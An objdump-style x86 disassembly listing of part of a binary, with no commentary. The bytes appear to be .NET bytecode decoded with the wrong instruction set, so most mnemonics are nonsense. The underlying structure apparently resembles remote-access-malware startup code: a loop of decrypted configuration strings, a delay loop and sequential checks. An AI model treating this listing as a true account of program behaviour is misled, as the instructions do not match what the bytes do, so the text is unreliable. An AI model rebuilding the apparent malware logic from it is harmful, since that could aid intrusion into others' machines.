  4025ec:	01 00                	add    %eax,(%eax)
  4025ee:	04 02                	add    $0x2,%al
  4025f0:	1f                   	pop    %ds
  4025f1:	0b 7d a1             	or     -0x5f(%ebp),%edi
  4025f4:	01 00                	add    %eax,(%eax)
  4025f6:	04 2a                	add    $0x2a,%al
  4025f8:	52                   	push   %edx
  4025f9:	02 28                	add    (%eax),%ch
  4025fb:	99                   	cltd
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	06                   	push   %es
  4025ff:	25 03 7d 9e 01       	and    $0x19e7d03,%eax
  402604:	00 04 04             	add    %al,(%esp,%eax,1)
  402607:	6f                   	outsl  %ds:(%esi),(%dx)
  402608:	aa                   	stos   %al,%es:(%edi)
  402609:	00 00                	add    %al,(%eax)
  40260b:	06                   	push   %es
  40260c:	2a 56 02             	sub    0x2(%esi),%dl
  40260f:	28 99 00 00 06 25    	sub    %bl,0x25060000(%ecx)
  402615:	03 7d 9e             	add    -0x62(%ebp),%edi
  402618:	01 00                	add    %eax,(%eax)
  40261a:	04 04                	add    $0x4,%al
  40261c:	6a 6f                	push   $0x6f
  40261e:	9d                   	popf
  40261f:	00 00                	add    %al,(%eax)
  402621:	06                   	push   %es
  402622:	2a 56 02             	sub    0x2(%esi),%dl
  402625:	28 94 00 00 06 02 14 	sub    %dl,0x14020600(%eax,%eax,1)
  40262c:	7d a0                	jge    0x4025ce
  40262e:	01 00                	add    %eax,(%eax)
  402630:	04 02                	add    $0x2,%al
  402632:	17                   	pop    %ss
  402633:	7d a1                	jge    0x4025d6
  402635:	01 00                	add    %eax,(%eax)
  402637:	04 2a                	add    $0x2a,%al
  402639:	3e 02 03             	add    %ds:(%ebx),%al
  40263c:	7d a0                	jge    0x4025de
  40263e:	01 00                	add    %eax,(%eax)
  402640:	04 02                	add    $0x2,%al
  402642:	1a 7d a1             	sbb    -0x5f(%ebp),%bh
  402645:	01 00                	add    %eax,(%eax)
  402647:	04 2a                	add    $0x2a,%al
  402649:	76 02                	jbe    0x40264d
  40264b:	7b a0                	jnp    0x4025ed
  40264d:	01 00                	add    %eax,(%eax)
  40264f:	04 3a                	add    $0x3a,%al
  402651:	06                   	push   %es
  402652:	00 00                	add    %al,(%eax)
  402654:	00 72 59             	add    %dh,0x59(%edx)
  402657:	14 00                	adc    $0x0,%al
  402659:	70 2a                	jo     0x402685
  40265b:	02 7b a0             	add    -0x60(%ebx),%bh
  40265e:	01 00                	add    %eax,(%eax)
  402660:	04 6f                	add    $0x6f,%al
  402662:	3d 00 00 0a 2a       	cmp    $0x2a0a0000,%eax
  402667:	52                   	push   %edx
  402668:	02 1d 7d a1 01 00    	add    0x1a17d,%bl
  40266e:	04 02                	add    $0x2,%al
  402670:	03 8c 91 00 00 01 7d 	add    0x7d010000(%ecx,%edx,4),%ecx
  402677:	a0 01 00 04 2a       	mov    0x2a040001,%al
  40267c:	56                   	push   %esi
  40267d:	02 1f                	add    (%edi),%bl
  40267f:	09 7d a1             	or     %edi,-0x5f(%ebp)
  402682:	01 00                	add    %eax,(%eax)
  402684:	04 02                	add    $0x2,%al
  402686:	03 8c b5 00 00 01 7d 	add    0x7d010000(%ebp,%esi,4),%ecx
  40268d:	a0 01 00 04 2a       	mov    0x2a040001,%al
  402692:	52                   	push   %edx
  402693:	02 1e                	add    (%esi),%bl
  402695:	7d a1                	jge    0x402638
  402697:	01 00                	add    %eax,(%eax)
  402699:	04 02                	add    $0x2,%al
  40269b:	03 8c b4 00 00 01 7d 	add    0x7d010000(%esp,%esi,4),%ecx
  4026a2:	a0 01 00 04 2a       	mov    0x2a040001,%al
  4026a7:	1e                   	push   %ds
  4026a8:	02 28                	add    (%eax),%ch
  4026aa:	ab                   	stos   %eax,%es:(%edi)
  4026ab:	00 00                	add    %al,(%eax)
  4026ad:	06                   	push   %es
  4026ae:	2a 22                	sub    (%edx),%ah
  4026b0:	02 03                	add    (%ebx),%al
  4026b2:	28 aa 00 00 06 2a    	sub    %ch,0x2a060000(%edx)
  4026b8:	1e                   	push   %ds
  4026b9:	02 28                	add    (%eax),%ch
  4026bb:	a0 00 00 06 2a       	mov    0x2a060000,%al
  4026c0:	22 02                	and    (%edx),%al
  4026c2:	03 28                	add    (%eax),%ebp
  4026c4:	9d                   	popf
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	06                   	push   %es
  4026c8:	2a 1e                	sub    (%esi),%bl
  4026ca:	02 28                	add    (%eax),%ch
  4026cc:	a1 00 00 06 2a       	mov    0x2a060000,%eax
  4026d1:	22 02                	and    (%edx),%al
  4026d3:	03 28                	add    (%eax),%ebp
  4026d5:	ae                   	scas   %es:(%edi),%al
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	06                   	push   %es
  4026d9:	2a 1e                	sub    (%esi),%bl
  4026db:	02 7b a1             	add    -0x5f(%ebx),%bh
  4026de:	01 00                	add    %eax,(%eax)
  4026e0:	04 2a                	add    $0x2a,%al
  4026e2:	32 02                	xor    (%edx),%al
  4026e4:	7b a3                	jnp    0x402689
  4026e6:	01 00                	add    %eax,(%eax)
  4026e8:	04 73                	add    $0x73,%al
  4026ea:	88 00                	mov    %al,(%eax)
  4026ec:	00 06                	add    %al,(%esi)
  4026ee:	2a 4a 02             	sub    0x2(%edx),%cl
  4026f1:	73 69                	jae    0x40275c
  4026f3:	00 00                	add    %al,(%eax)
  4026f5:	0a 7d a3             	or     -0x5d(%ebp),%bh
  4026f8:	01 00                	add    %eax,(%eax)
  4026fa:	04 02                	add    $0x2,%al
  4026fc:	28 1b                	sub    %bl,(%ebx)
  4026fe:	00 00                	add    %al,(%eax)
  402700:	0a 2a                	or     (%edx),%ch
  402702:	3a 02                	cmp    (%edx),%al
  402704:	6f                   	outsl  %ds:(%esi),(%dx)
  402705:	38 01                	cmp    %al,(%ecx)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	d2 02                	rolb   %cl,(%edx)
  40270b:	28 c0                	sub    %al,%al
  40270d:	00 00                	add    %al,(%eax)
  40270f:	06                   	push   %es
  402710:	2a 32                	sub    (%edx),%dh
  402712:	02 20                	add    (%eax),%ah
  402714:	c0 00 00             	rolb   $0x0,(%eax)
  402717:	00 6f 26             	add    %ch,0x26(%edi)
  40271a:	01 00                	add    %eax,(%eax)
  40271c:	0a 2a                	or     (%edx),%ch
  40271e:	6a 02                	push   $0x2
  402720:	20 cb                	and    %cl,%bl
  402722:	00 00                	add    %al,(%eax)
  402724:	00 6f 26             	add    %ch,0x26(%edi)
  402727:	01 00                	add    %eax,(%eax)
  402729:	0a 02                	or     (%edx),%al
  40272b:	03 28                	add    (%eax),%ebp
  40272d:	85 00                	test   %eax,(%eax)
  40272f:	00 06                	add    %al,(%esi)
  402731:	16                   	push   %ss
  402732:	1e                   	push   %ds
  402733:	6f                   	outsl  %ds:(%esi),(%dx)
  402734:	51                   	push   %ecx
  402735:	00 00                	add    %al,(%eax)
  402737:	0a 2a                	or     (%edx),%ch
  402739:	7e 02                	jle    0x40273d
  40273b:	20 ca                	and    %cl,%dl
  40273d:	00 00                	add    %al,(%eax)
  40273f:	00 6f 26             	add    %ch,0x26(%edi)
  402742:	01 00                	add    %eax,(%eax)
  402744:	0a 02                	or     (%edx),%al
  402746:	03 28                	add    (%eax),%ebp
  402748:	35 01 00 0a 28       	xor    $0x280a0001,%eax
  40274d:	81 00 00 06 16 1a    	addl   $0x1a160600,(%eax)
  402753:	6f                   	outsl  %ds:(%esi),(%dx)
  402754:	51                   	push   %ecx
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 2a                	or     (%edx),%ch
  402759:	7a 03                	jp     0x40275e
  40275b:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  40275e:	00 00                	add    %al,(%eax)
  402760:	02 20                	add    (%eax),%ah
  402762:	c3                   	ret
  402763:	00 00                	add    %al,(%eax)
  402765:	00 6f 26             	add    %ch,0x26(%edi)
  402768:	01 00                	add    %eax,(%eax)
  40276a:	0a 2a                	or     (%edx),%ch
  40276c:	02 20                	add    (%eax),%ah
  40276e:	c2 00 00             	ret    $0x0
  402771:	00 6f 26             	add    %ch,0x26(%edi)
  402774:	01 00                	add    %eax,(%eax)
  402776:	0a 2a                	or     (%edx),%ch
  402778:	1b 30                	sbb    (%eax),%esi
  40277a:	02 00                	add    (%eax),%al
  40277c:	27                   	daa
  40277d:	01 00                	add    %eax,(%eax)
  40277f:	00 01                	add    %al,(%ecx)
  402781:	00 00                	add    %al,(%eax)
  402783:	11 16                	adc    %edx,(%esi)
  402785:	0a 38                	or     (%eax),%bh
  402787:	0e                   	push   %cs
  402788:	00 00                	add    %al,(%eax)
  40278a:	00 20                	add    %ah,(%eax)
  40278c:	e8 03 00 00 28       	call   0x28402794
  402791:	17                   	pop    %ss
  402792:	00 00                	add    %al,(%eax)
  402794:	0a 06                	or     (%esi),%al
  402796:	17                   	pop    %ss
  402797:	58                   	pop    %eax
  402798:	0a 06                	or     (%esi),%al
  40279a:	7e 10                	jle    0x4027ac
  40279c:	00 00                	add    %al,(%eax)
  40279e:	04 28                	add    $0x28,%al
  4027a0:	18 00                	sbb    %al,(%eax)
  4027a2:	00 0a                	add    %cl,(%edx)
  4027a4:	32 e5                	xor    %ch,%ah
  4027a6:	28 03                	sub    %al,(%ebx)
  4027a8:	00 00                	add    %al,(%eax)
  4027aa:	06                   	push   %es
  4027ab:	3a 06                	cmp    (%esi),%al
  4027ad:	00 00                	add    %al,(%eax)
  4027af:	00 16                	add    %dl,(%esi)
  4027b1:	28 19                	sub    %bl,(%ecx)
  4027b3:	00 00                	add    %al,(%eax)
  4027b5:	0a 00                	or     (%eax),%al
  4027b7:	7e 13                	jle    0x4027cc
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	04 28                	add    $0x28,%al
  4027bd:	1a 00                	sbb    (%eax),%al
  4027bf:	00 0a                	add    %cl,(%edx)
  4027c1:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4027c7:	38 00                	cmp    %al,(%eax)
  4027c9:	00 06                	add    %al,(%esi)
  4027cb:	dd 06                	fldl   (%esi)
  4027cd:	00 00                	add    %al,(%eax)
  4027cf:	00 26                	add    %ah,(%esi)
  4027d1:	dd 00                	fldl   (%eax)
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	00 28                	add    %ch,(%eax)
  4027d7:	63 00                	arpl   %eax,(%eax)
  4027d9:	00 06                	add    %al,(%esi)
  4027db:	28 68 00             	sub    %ch,0x0(%eax)
  4027de:	00 06                	add    %al,(%esi)
  4027e0:	3a 06                	cmp    (%esi),%al
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	00 16                	add    %dl,(%esi)
  4027e6:	28 19                	sub    %bl,(%ecx)
  4027e8:	00 00                	add    %al,(%eax)
  4027ea:	0a dd                	or     %ch,%bl
  4027ec:	06                   	push   %es
  4027ed:	00 00                	add    %al,(%eax)
  4027ef:	00 26                	add    %ah,(%esi)
  4027f1:	dd 00                	fldl   (%eax)
  4027f3:	00 00                	add    %al,(%eax)
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	7e 12                	jle    0x40280b
  4027f9:	00 00                	add    %al,(%eax)
  4027fb:	04 28                	add    $0x28,%al
  4027fd:	1a 00                	sbb    (%eax),%al
  4027ff:	00 0a                	add    %cl,(%edx)
  402801:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402807:	2c 00                	sub    $0x0,%al
  402809:	00 06                	add    %al,(%esi)
  40280b:	dd 06                	fldl   (%esi)
  40280d:	00 00                	add    %al,(%eax)
  40280f:	00 26                	add    %ah,(%esi)
  402811:	dd 00                	fldl   (%eax)
  402813:	00 00                	add    %al,(%eax)
  402815:	00 00                	add    %al,(%eax)
  402817:	7e 0e                	jle    0x402827
  402819:	00 00                	add    %al,(%eax)
  40281b:	04 28                	add    $0x28,%al
  40281d:	1a 00                	sbb    (%eax),%al
  40281f:	00 0a                	add    %cl,(%edx)
  402821:	39 0f                	cmp    %ecx,(%edi)
  402823:	00 00                	add    %al,(%eax)
  402825:	00 28                	add    %ch,(%eax)
  402827:	49                   	dec    %ecx
  402828:	00 00                	add    %al,(%eax)
  40282a:	06                   	push   %es
  40282b:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402831:	6f                   	outsl  %ds:(%esi),(%dx)
  402832:	00 00                	add    %al,(%eax)
  402834:	06                   	push   %es
  402835:	dd 06                	fldl   (%esi)
  402837:	00 00                	add    %al,(%eax)
  402839:	00 26                	add    %ah,(%esi)
  40283b:	dd 00                	fldl   (%eax)
  40283d:	00 00                	add    %al,(%eax)
  40283f:	00 00                	add    %al,(%eax)
  402841:	7e 04                	jle    0x402847
  402843:	00 00                	add    %al,(%eax)
  402845:	04 28                	add    $0x28,%al
  402847:	1a 00                	sbb    (%eax),%al
  402849:	00 0a                	add    %cl,(%edx)
  40284b:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402851:	28 00                	sub    %al,(%eax)
  402853:	00 06                	add    %al,(%esi)
  402855:	dd 06                	fldl   (%esi)
  402857:	00 00                	add    %al,(%eax)
  402859:	00 26                	add    %ah,(%esi)
  40285b:	dd 00                	fldl   (%eax)
  40285d:	00 00                	add    %al,(%eax)
  40285f:	00 28                	add    %ch,(%eax)
  402861:	4f                   	dec    %edi
  402862:	00 00                	add    %al,(%eax)
  402864:	06                   	push   %es
  402865:	28 49 00             	sub    %cl,0x0(%ecx)
  402868:	00 06                	add    %al,(%esi)
  40286a:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402870:	51                   	push   %ecx
  402871:	00 00                	add    %al,(%eax)
  402873:	06                   	push   %es
  402874:	dd 06                	fldl   (%esi)
  402876:	00 00                	add    %al,(%eax)
  402878:	00 26                	add    %ah,(%esi)
  40287a:	dd 00                	fldl   (%eax)
  40287c:	00 00                	add    %al,(%eax)
  40287e:	00 00                	add    %al,(%eax)
  402880:	28 12                	sub    %dl,(%edx)
  402882:	00 00                	add    %al,(%eax)
  402884:	06                   	push   %es
  402885:	3a 0a                	cmp    (%edx),%cl
  402887:	00 00                	add    %al,(%eax)
  402889:	00 28                	add    %ch,(%eax)
  40288b:	1e                   	push   %ds
  40288c:	00 00                	add    %al,(%eax)
  40288e:	06                   	push   %es
  40288f:	28 1b                	sub    %bl,(%ebx)
  402891:	00 00                	add    %al,(%eax)
  402893:	06                   	push   %es
  402894:	dd 06                	fldl   (%esi)
  402896:	00 00                	add    %al,(%eax)
  402898:	00 26                	add    %ah,(%esi)
  40289a:	dd 00                	fldl   (%eax)
  40289c:	00 00                	add    %al,(%eax)
  40289e:	00 20                	add    %ah,(%eax)
  4028a0:	88 13                	mov    %dl,(%ebx)
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	28 17                	sub    %dl,(%edi)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	0a 2b                	or     (%ebx),%ch
  4028aa:	d4 00                	aam    $0x0
  4028ac:	01 58 00             	add    %ebx,0x0(%eax)
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	00 33                	add    %dh,(%ebx)
  4028b3:	00 19                	add    %bl,(%ecx)
  4028b5:	4c                   	dec    %esp
  4028b6:	00 06                	add    %al,(%esi)
  4028b8:	01 00                	add    %eax,(%eax)
  4028ba:	00 01                	add    %al,(%ecx)
  4028bc:	00 00                	add    %al,(%eax)
  4028be:	57                   	push   %edi
  4028bf:	00 15 6c 00 06 01    	add    %dl,0x106006c
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	01 00                	add    %eax,(%eax)
  4028c9:	00 73 00             	add    %dh,0x0(%ebx)
  4028cc:	19 8c 00 06 01 00 00 	sbb    %ecx,0x106(%eax,%eax,1)
  4028d3:	01 00                	add    %eax,(%eax)
  4028d5:	00 93 00 23 b6 00    	add    %dl,0xb62300(%ebx)
  4028db:	06                   	push   %es
  4028dc:	01 00                	add    %eax,(%eax)
  4028de:	00 01                	add    %al,(%ecx)
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	bd 00 19 d6 00       	mov    $0xd61900,%ebp
  4028e7:	06                   	push   %es
  4028e8:	01 00                	add    %eax,(%eax)
  4028ea:	00 01                	add    %al,(%ecx)
  4028ec:	00 00                	add    %al,(%eax)
  4028ee:	e1 00                	loope  0x4028f0
  4028f0:	14 f5                	adc    $0xf5,%al
  4028f2:	00 06                	add    %al,(%esi)
  4028f4:	01 00                	add    %eax,(%eax)
  4028f6:	00 01                	add    %al,(%ecx)
  4028f8:	00 00                	add    %al,(%eax)
  4028fa:	fc                   	cld
  4028fb:	00 19                	add    %bl,(%ecx)
  4028fd:	15 01 06 01 00       	adc    $0x10601,%eax
  402902:	00 01                	add    %al,(%ecx)
  402904:	1b 30                	sbb    (%eax),%esi
  402906:	02 00                	add    (%eax),%al
  402908:	41                   	inc    %ecx
  402909:	01 00                	add    %eax,(%eax)
  40290b:	00 02                	add    %al,(%edx)
  40290d:	00 00                	add    %al,(%eax)
  40290f:	11 28                	adc    %ebp,(%eax)
  402911:	1c 00                	sbb    $0x0,%al
  402913:	00 0a                	add    %cl,(%edx)
  402915:	7e 07                	jle    0x40291e
  402917:	00 00                	add    %al,(%eax)
  402919:	04 28                	add    $0x28,%al
  40291b:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402920:	1e                   	push   %ds
  402921:	00 00                	add    %al,(%eax)
  402923:	0a 80 07 00 00 04    	or     0x4000007(%eax),%al
  402929:	7e 07                	jle    0x402932
  40292b:	00 00                	add    %al,(%eax)
  40292d:	04 73                	add    $0x73,%al
  40292f:	76 00                	jbe    0x402931
  402931:	00 06                	add    %al,(%esi)
  402933:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  402937:	04 7e                	add    $0x7e,%al
  402939:	0c 00                	or     $0x0,%al
  40293b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40293e:	01 00                	add    %eax,(%eax)
  402940:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402943:	79 00                	jns    0x402945
  402945:	00 06                	add    %al,(%esi)
  402947:	80 01 00             	addb   $0x0,(%ecx)
  40294a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40294d:	0c 00                	or     $0x0,%al
  40294f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402952:	02 00                	add    (%eax),%al
  402954:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402957:	79 00                	jns    0x402959
  402959:	00 06                	add    %al,(%esi)
  40295b:	80 02 00             	addb   $0x0,(%edx)
  40295e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402961:	0c 00                	or     $0x0,%al
  402963:	00 04 7e             	add    %al,(%esi,%edi,2)
  402966:	03 00                	add    (%eax),%eax
  402968:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40296b:	79 00                	jns    0x40296d
  40296d:	00 06                	add    %al,(%esi)
  40296f:	80 03 00             	addb   $0x0,(%ebx)
  402972:	00 04 7e             	add    %al,(%esi,%edi,2)
  402975:	0c 00                	or     $0x0,%al
  402977:	00 04 7e             	add    %al,(%esi,%edi,2)
  40297a:	04 00                	add    $0x0,%al
  40297c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40297f:	79 00                	jns    0x402981
  402981:	00 06                	add    %al,(%esi)
  402983:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  402987:	04 7e                	add    $0x7e,%al
  402989:	0c 00                	or     $0x0,%al
  40298b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40298e:	08 00                	or     %al,(%eax)
  402990:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402993:	79 00                	jns    0x402995
  402995:	00 06                	add    %al,(%esi)
  402997:	80 08 00             	orb    $0x0,(%eax)
  40299a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40299d:	0c 00                	or     $0x0,%al
  40299f:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029a2:	0d 00 00 04 6f       	or     $0x6f040000,%eax
  4029a7:	79 00                	jns    0x4029a9
  4029a9:	00 06                	add    %al,(%esi)
  4029ab:	80 0d 00 00 04 7e 0c 	orb    $0xc,0x7e040000
  4029b2:	00 00                	add    %al,(%eax)
  4029b4:	04 7e                	add    $0x7e,%al
  4029b6:	13 00                	adc    (%eax),%eax
  4029b8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4029bb:	79 00                	jns    0x4029bd
  4029bd:	00 06                	add    %al,(%esi)
  4029bf:	80 13 00             	adcb   $0x0,(%ebx)
  4029c2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029c5:	0c 00                	or     $0x0,%al
  4029c7:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029ca:	12 00                	adc    (%eax),%al
  4029cc:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4029cf:	79 00                	jns    0x4029d1
  4029d1:	00 06                	add    %al,(%esi)
  4029d3:	80 12 00             	adcb   $0x0,(%edx)
  4029d6:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029d9:	0c 00                	or     $0x0,%al
  4029db:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029de:	0e                   	push   %cs
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	04 6f                	add    $0x6f,%al
  4029e3:	79 00                	jns    0x4029e5
  4029e5:	00 06                	add    %al,(%esi)
  4029e7:	80 0e 00             	orb    $0x0,(%esi)
  4029ea:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029ed:	0c 00                	or     $0x0,%al
  4029ef:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029f2:	11 00                	adc    %eax,(%eax)
  4029f4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4029f7:	79 00                	jns    0x4029f9
  4029f9:	00 06                	add    %al,(%esi)
  4029fb:	80 11 00             	adcb   $0x0,(%ecx)
  4029fe:	00 04 28             	add    %al,(%eax,%ebp,1)
  402a01:	47                   	inc    %edi
  402a02:	00 00                	add    %al,(%eax)
  402a04:	06                   	push   %es
  402a05:	80 0f 00             	orb    $0x0,(%edi)
  402a08:	00 04 7e             	add    %al,(%esi,%edi,2)
  402a0b:	0c 00                	or     $0x0,%al
  402a0d:	00 04 7e             	add    %al,(%esi,%edi,2)
  402a10:	0a 00                	or     (%eax),%al
  402a12:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402a15:	79 00                	jns    0x402a17
  402a17:	00 06                	add    %al,(%esi)
  402a19:	80 0a 00             	orb    $0x0,(%edx)
  402a1c:	00 04 7e             	add    %al,(%esi,%edi,2)
  402a1f:	0c 00                	or     $0x0,%al
  402a21:	00 04 7e             	add    %al,(%esi,%edi,2)
  402a24:	09 00                	or     %eax,(%eax)
  402a26:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402a29:	79 00                	jns    0x402a2b
  402a2b:	00 06                	add    %al,(%esi)
  402a2d:	28 1d 00 00 0a 73    	sub    %bl,0x730a0000
  402a33:	1f                   	pop    %ds
  402a34:	00 00                	add    %al,(%eax)
  402a36:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402a3c:	28 04 00             	sub    %al,(%eax,%eax,1)
  402a3f:	00 06                	add    %al,(%esi)
  402a41:	0a dd                	or     %ch,%bl
  402a43:	08 00                	or     %al,(%eax)
  402a45:	00 00                	add    %al,(%eax)
  402a47:	26 16                	es push %ss
  402a49:	0a dd                	or     %ch,%bl
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	06                   	push   %es
  402a50:	2a 00                	sub    (%eax),%al
  402a52:	00 00                	add    %al,(%eax)
  402a54:	41                   	inc    %ecx
  402a55:	1c 00                	sbb    $0x0,%al
	...
  402a5f:	00 37                	add    %dh,(%edi)
  402a61:	01 00                	add    %eax,(%eax)
  402a63:	00 37                	add    %dh,(%edi)
  402a65:	01 00                	add    %eax,(%eax)
  402a67:	00 08                	add    %cl,(%eax)
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 01                	add    %al,(%ecx)
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	01 1b                	add    %ebx,(%ebx)
  402a71:	30 04 00             	xor    %al,(%eax,%eax,1)
  402a74:	67 00 00             	add    %al,(%bx,%si)
  402a77:	00 03                	add    %al,(%ebx)
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	11 7e 0b             	adc    %edi,0xb(%esi)
  402a7e:	00 00                	add    %al,(%eax)
  402a80:	04 6f                	add    $0x6f,%al
  402a82:	20 00                	and    %al,(%eax)
  402a84:	00 0a                	add    %cl,(%edx)
  402a86:	6f                   	outsl  %ds:(%esi),(%dx)
  402a87:	21 00                	and    %eax,(%eax)
  402a89:	00 0a                	add    %cl,(%edx)
  402a8b:	74 3a                	je     0x402ac7
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	01 0a                	add    %ecx,(%edx)
  402a91:	73 22                	jae    0x402ab5
  402a93:	00 00                	add    %al,(%eax)
  402a95:	0a 0b                	or     (%ebx),%cl
  402a97:	06                   	push   %es
  402a98:	07                   	pop    %es
  402a99:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a9c:	00 0a                	add    %cl,(%edx)
  402a9e:	7e 07                	jle    0x402aa7
  402aa0:	00 00                	add    %al,(%eax)
  402aa2:	04 6f                	add    $0x6f,%al
  402aa4:	23 00                	and    (%eax),%eax
  402aa6:	00 0a                	add    %cl,(%edx)
  402aa8:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa9:	24 00                	and    $0x0,%al
  402aab:	00 0a                	add    %cl,(%edx)
  402aad:	72 01                	jb     0x402ab0
  402aaf:	00 00                	add    %al,(%eax)
  402ab1:	70 28                	jo     0x402adb
  402ab3:	25 00 00 0a 7e       	and    $0x7e0a0000,%eax
  402ab8:	0a 00                	or     (%eax),%al
  402aba:	00 04 28             	add    %al,(%eax,%ebp,1)
  402abd:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402ac2:	26 00 00             	add    %al,%es:(%eax)
  402ac5:	0a 0c dd 15 00 00 00 	or     0x15(,%ebx,8),%cl
  402acc:	07                   	pop    %es
  402acd:	39 06                	cmp    %eax,(%esi)
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	00 07                	add    %al,(%edi)
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	27                   	daa
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	0a dc                	or     %ah,%bl
  402ad9:	26 16                	es push %ss
  402adb:	0c dd                	or     $0xdd,%al
  402add:	00 00                	add    %al,(%eax)
  402adf:	00 00                	add    %al,(%eax)
  402ae1:	08 2a                	or     %ch,(%edx)
  402ae3:	00 01                	add    %al,(%ecx)
  402ae5:	1c 00                	sbb    $0x0,%al
  402ae7:	00 02                	add    %al,(%edx)
  402ae9:	00 1b                	add    %bl,(%ebx)
  402aeb:	00 35 50 00 0d 00    	add    %dh,0xd0050
  402af1:	00 00                	add    %al,(%eax)
  402af3:	00 00                	add    %al,(%eax)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402afa:	00 08                	add    %cl,(%eax)
  402afc:	41                   	inc    %ecx
  402afd:	00 00                	add    %al,(%eax)
  402aff:	01 13                	add    %edx,(%ebx)
  402b01:	30 01                	xor    %al,(%ecx)
  402b03:	00 a7 00 00 00 00    	add    %ah,0x0(%edi)
  402b09:	00 00                	add    %al,(%eax)
  402b0b:	00 72 0f             	add    %dh,0xf(%edx)
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	70 80                	jo     0x402a92
  402b12:	01 00                	add    %eax,(%eax)
  402b14:	00 04 72             	add    %al,(%edx,%esi,2)
  402b17:	12 01                	adc    (%ecx),%al
  402b19:	00 70 80             	add    %dh,-0x80(%eax)
  402b1c:	02 00                	add    (%eax),%al
  402b1e:	00 04 72             	add    %al,(%edx,%esi,2)
  402b21:	15 03 00 70 80       	adc    $0x80700003,%eax
  402b26:	03 00                	add    (%eax),%eax
  402b28:	00 04 72             	add    %al,(%edx,%esi,2)
  402b2b:	c8 03 00 70          	enter  $0x3,$0x70
  402b2f:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  402b33:	04 72                	add    $0x72,%al
  402b35:	7b 04                	jnp    0x402b3b
  402b37:	00 70 80             	add    %dh,-0x80(%eax)
  402b3a:	05 00 00 04 72       	add    $0x72040000,%eax
  402b3f:	8f 04 00             	pop    (%eax,%eax,1)
  402b42:	70 80                	jo     0x402ac4
  402b44:	06                   	push   %es
  402b45:	00 00                	add    %al,(%eax)
  402b47:	04 72                	add    $0x72,%al
  402b49:	b9 04 00 70 80       	mov    $0x80700004,%ecx
  402b4e:	07                   	pop    %es
  402b4f:	00 00                	add    %al,(%eax)
  402b51:	04 72                	add    $0x72,%al
  402b53:	13 05 00 70 80 08    	adc    0x8807000,%eax
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	04 72                	add    $0x72,%al
  402b5d:	ee                   	out    %al,(%dx)
  402b5e:	05 00 70 80 09       	add    $0x9807000,%eax
  402b63:	00 00                	add    %al,(%eax)
  402b65:	04 72                	add    $0x72,%al
  402b67:	71 0e                	jno    0x402b77
  402b69:	00 70 80             	add    %dh,-0x80(%eax)
  402b6c:	0a 00                	or     (%eax),%al
  402b6e:	00 04 72             	add    %al,(%edx,%esi,2)
  402b71:	cc                   	int3
  402b72:	10 00                	adc    %al,(%eax)
  402b74:	70 80                	jo     0x402af6
  402b76:	0d 00 00 04 72       	or     $0x72040000,%eax
  402b7b:	7f 11                	jg     0x402b8e
  402b7d:	00 70 80             	add    %dh,-0x80(%eax)
  402b80:	0e                   	push   %cs
  402b81:	00 00                	add    %al,(%eax)
  402b83:	04 14                	add    $0x14,%al
  402b85:	80 0f 00             	orb    $0x0,(%edi)
  402b88:	00 04 72             	add    %al,(%edx,%esi,2)
  402b8b:	32 12                	xor    (%edx),%dl
